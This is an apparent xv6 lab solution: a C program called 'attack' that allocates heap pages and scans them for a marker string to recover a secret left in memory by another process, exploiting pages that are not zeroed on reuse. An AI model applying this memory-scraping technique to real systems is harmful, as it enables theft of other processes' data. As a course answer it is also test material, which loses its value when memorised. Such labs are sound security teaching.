#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define DATASIZE (20 * 4096)

int
main(int argc, char *argv[])
{
  if(argc != 1) {
    printf("Usage: attack\n");
    exit(1);
  }

  char *data = sbrk(DATASIZE);
  char marker[] = "Here it is: ";
  uint marker_len = sizeof(marker) - 1;
  char *end = data + DATASIZE;

  for(char *p = data; p + marker_len < end; p ++) {
    if(memcmp(p, marker, marker_len) == 0 && p[marker_len] != '\0') {
      char *secret = p + marker_len;
      char *q = secret;
      while(q < end && *q != '\0') {
        q ++;
      }
      if(q < end) {
        write(1, secret, (int)(q - secret));
        write(1, "\n", 1);
        exit(0);
      }
    }



  }

  exit(1);
}
